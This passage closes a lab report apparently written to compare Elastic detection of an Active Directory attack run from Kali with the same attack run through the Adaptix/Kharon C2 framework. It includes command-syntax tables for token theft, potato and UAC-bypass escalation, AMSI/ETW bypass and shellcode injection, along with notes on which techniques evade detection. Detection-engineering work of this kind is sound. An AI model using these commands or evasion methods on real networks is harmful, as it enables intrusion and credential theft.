| `runas-user` | `runas-user <user> <pass> <domain> <cmd>` | Run as different user |
| `runas-session` | `runas-session <session_id> <filepath>` | Run in another session |

### Elevation-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `getsystem token` | `getsystem token` | SYSTEM via token impersonation |
| `potato-dcom` | `potato-dcom --token` or `potato-dcom --run <cmd>` | DCOM potato |
| `potato-print` | `potato-print --token` or `potato-print --run <cmd>` | PrintSpoofer |
| `uacbypass sspi` | `uacbypass sspi <file.exe>` | UAC bypass via SSPI |
| `uacbypass registryshellcmd` | `uacbypass registryshellcmd <file.exe>` | UAC bypass via registry |

### SAL-BOF (Situational Awareness - Local)

| Command | Syntax | Purpose |
|---------|--------|---------|
| `whoami` | `whoami` | Current user (BOF, no child process) |
| `ipconfig` | `ipconfig` | Network config (BOF) |
| `arp` | `arp` | ARP table (BOF) |
| `env` | `env` | Environment variables (BOF) |
| `uptime` | `uptime` | System uptime (BOF) |
| `routeprint` | `routeprint` | IPv4 routes (BOF) |
| `dir` | `dir <path> [/s]` | Directory listing (BOF) |
| `cacls` | `cacls <path>` | File/dir permissions (BOF) |
| `nslookup` | `nslookup <domain> [server] [type]` | DNS query (BOF) |
| `listdns` | `listdns` | DNS cache (BOF) |
| `useridletime` | `useridletime` | User idle time (BOF) |
| `privcheck` | `privcheck <module>` | PrivEsc checks (BOF) |

### SAR-BOF (Situational Awareness - Remote)

| Command | Syntax | Purpose |
|---------|--------|---------|
| `smartscan` | `smartscan <targets> [-p fast\|standart\|full\|port_list]` | Port scan (BOF) |
| `nbtscan` | `nbtscan <target> [-v] [-q] [-t timeout]` | NetBIOS scan (BOF) |
| `quser` | `quser [host]` | Query user sessions (BOF) |
| `taskhound` | `taskhound <target> [user] [pass] [-save dir]` | Scheduled task enum (BOF) |

### Kharon Built-in Commands

| Command | Syntax | Purpose |
|---------|--------|---------|
| `info` | `info` | Session and system info |
| `config sleep` | `config sleep <ms>` | Callback interval |
| `config jitter` | `config jitter <percent>` | Sleep randomization |
| `config ppid` | `config ppid <pid>` | Parent PID spoof |
| `config blockdlls` | `config blockdlls <true\|false>` | Block non-MS DLLs |
| `config mask.beacon` | `config mask.beacon <timer\|none>` | Sleep obfuscation |
| `config mask.heap` | `config mask.heap <true\|false>` | Heap encryption |
| `config syscall` | `config syscall <spoof\|spoof_indirect>` | Syscall method |
| `config bof_api_proxy` | `config bof_api_proxy <true\|false>` | BOF API proxy |
| `config spawnto` | `config spawnto <path>` | Sacrificial process |
| `config amsi_etw_bypass` | `config amsi_etw_bypass <all\|etw\|amsi\|none>` | AMSI/ETW bypass |
| `config worktime` | `config worktime <start> <end>` | Activity hours |
| `token getuid` | `token getuid` | Show current user |
| `token list` | `token list` | List stored tokens |
| `token steal` | `token steal <pid>` | Steal token from process |
| `token impersonate` | `token impersonate <id>` | Use stored token |
| `token rm` | `token rm <id>` | Remove stored token |
| `token revert` | `token revert` | Revert to original token |
| `token make` | `token make --domain D --username U --password P` | Create impersonation token |
| `token privget` | `token privget` | Token privilege details |
| `token privlist` | `token privlist` | List token privileges |
| `fs` | `fs <pwd\|cd\|ls\|cat\|mkdir\|cp\|mv\|rm> [args]` | File operations |
| `process list` | `process list` | List running processes |
| `process kill` | `process kill <pid> [exit_code]` | Terminate process |
| `process create` | `process create --command <cmd> [--pipe true] [--state suspended]` | Execute process |
| `upload` | `upload <local_file> [remote_path]` | Upload file to target |
| `download` | `download <remote_path>` | Download file from target |
| `scinject` | `scinject <pid> <shellcode_file>` | Shellcode injection |
| `socks start` | `socks start <port>` | Start SOCKS5 proxy |
| `socks stop` | `socks stop` | Stop SOCKS5 proxy |
| `rportfwd start` | `rportfwd start <local_port> <remote_host> <remote_port>` | Reverse port forward |
| `rportfwd stop` | `rportfwd stop` | Stop port forward |
| `exit` | `exit <process\|thread>` | Terminate agent |
| `selfdel` | `selfdel` | Delete agent from disk |

---

## Appendix B - Elastic Index Patterns

| Source | Index Pattern | Events |
|--------|---------------|--------|
| Elastic Defend | `logs-endpoint.*` | Process, file, registry, network, API |
| Sysmon | `logs-windows.sysmon_operational-*` | Event IDs 1,7,8,10,11,12,13,14,17,18,22,25 |
| Windows Security | `logs-windows.forwarded-*` | Logon (4624), Kerberos (4768,4769), Service (7045) |
| Endpoint Alerts | `logs-endpoint.alerts-*` | Malware + behavioral alerts |

---

## Appendix C - Sysmon Event ID Quick Reference

| Event ID | Type | Fires On |
|----------|------|----------|
| 1 | ProcessCreate | Any new process. Key for detecting cmd.exe, powershell.exe, net.exe from unexpected parents. |
| 7 | ImageLoad | DLLs loaded from Temp, AppData, Users, Downloads. Catches dropped DLLs. |
| 8 | CreateRemoteThread | Injection via CreateRemoteThread or NtCreateThreadEx. Fires for CRT and section mapping (inject-sec). Does NOT fire for poolparty or CFG hijack. |
| 10 | ProcessAccess | Access to lsass.exe, csrss.exe, winlogon.exe with sensitive access masks. |
| 11 | FileCreate | Executable drops (.exe, .dll, .sys), scripts (.ps1, .bat), .lnk files. |
| 12/13/14 | RegistryEvent | Run keys, IFEO, services, InprocServer32. Catches persistence and SCShell. |
| 17/18 | PipeEvent | Named pipe create/connect. Catches PsExec (svcctl), CobaltStrike defaults. |
| 22 | DnsQuery | DNS from LOLBins (rundll32, certutil, mshta). Catches staged payloads. |
| 25 | ProcessTampering | Process hollowing, herpaderping. Catches masquerading techniques. |

---

## Key Findings

This exercise ran the same Active Directory attack chain twice against the same lab: once as a traditional pentest from Kali, and once through a C2 framework (Adaptix/Kharon) from a compromised domain-joined host. Both paths achieved full domain compromise (castelblack to winterfell to kingslanding). The detection results are different.

**Detection coverage comparison:**

| Metric | Pentest (from Kali) | Red Team (C2 from internal host) |
|--------|--------------------|---------------------------------|
| Prebuilt Elastic rules that fired | 12+ | 4 |
| Techniques with zero detection | 2 (AS-REP Roast, Kerberoast) | 10 (see Section 9.2) |
| LSASS-related alerts | 5+ rules | 0 (SAM-based approach avoided LSASS entirely) |
| Process creation events (Event ID 1) | Frequent (cmd, net, whoami) | Near zero (BOFs run in-process) |
| Source IP anomaly | External IP stands out immediately | Internal domain host blends with normal traffic |

**What the C2 approach avoids:**

1. **No child processes.** BOF-based recon (whoami, ipconfig, arp, dir) calls Windows APIs directly from the beacon process. No `cmd.exe` or `net.exe` spawned. No Sysmon Event ID 1.
2. **No LSASS access.** The `hashdump` BOF reads the SAM registry hive instead of opening a handle to `lsass.exe`. This bypasses all LSASS-focused detection rules.
3. **No external source IP.** Every connection originates from a domain-joined member server using Kerberos authentication. Network-based rules that flag external IPs do not fire.
4. **No Sysmon network telemetry for LDAP.** Inline BOF LDAP queries produce zero Sysmon Event ID 3 entries on the source host. Detection requires DC-side Event ID 1644 auditing, which is not enabled by default.
5. **No new service creation for lateral movement.** SCShell modifies an existing service ImagePath instead of creating a new one. This avoids Event ID 7045.

**What still gets detected regardless of approach:**

1. **DCSync.** The `Potential Credential Access via DCSync` rule fired even for targeted single-account DCSync. The replication GUIDs in Event ID 4662 are the same whether the request comes from Kali or from a BOF.
2. **GPO abuse.** The `Group Policy Abuse for Privilege Addition` rule fired. The SYSVOL modification and scheduled task creation are identical regardless of source.
3. **Shellcode injection (CRT and section mapping).** Sysmon Event ID 8 fires for any remote thread creation, including inject-sec. Indirect syscalls do not bypass the kernel callback that Sysmon hooks.
4. **Kerberos ticket operations.** Event IDs 4768 and 4769 are logged on the DC regardless of source. The events exist in raw logs. The gap is that no prebuilt Elastic rule fires on them.

**The real gap is not technique visibility. It is rule coverage.** The raw telemetry for most C2 actions exists somewhere in the logs. Kerberoasting produces Event 4769. AS-REP roasting produces Event 4768. SCShell produces Event 13 (registry modification). The problem is that Elastic's prebuilt rule set (152 rules in this deployment) does not include rules for these events. Section 9.3 provides four custom rules that close the most critical gaps.

**Bottom line:** A pentest from Kali tests whether your detections work at all. A C2-based red team test shows whether they work when the attacker operates from inside your network, avoids child processes, uses Kerberos authentication, and stays in memory. Both are necessary. Running only one gives a false picture of your detection posture.
